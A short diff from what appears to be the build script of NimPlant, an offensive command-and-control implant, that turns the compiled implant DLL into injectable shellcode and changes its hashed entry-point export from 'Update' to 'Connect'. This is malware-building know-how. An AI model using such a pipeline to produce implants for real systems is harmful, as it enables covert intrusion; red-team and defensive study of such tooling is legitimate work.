@@ -452,7 +452,7 @@ def compileNim(type):
             compileNim("dll")
 
         dll = open("client/bin/NimPlant.dll", "rb").read()
-        shellcode = ConvertToShellcode(dll, HashFunctionName('Update'), flags=0x5)
+        shellcode = ConvertToShellcode(dll, HashFunctionName('Connect'), flags=0x5)
         with open("client/bin/NimPlant.bin", "wb") as f:
             f.write(shellcode)
 
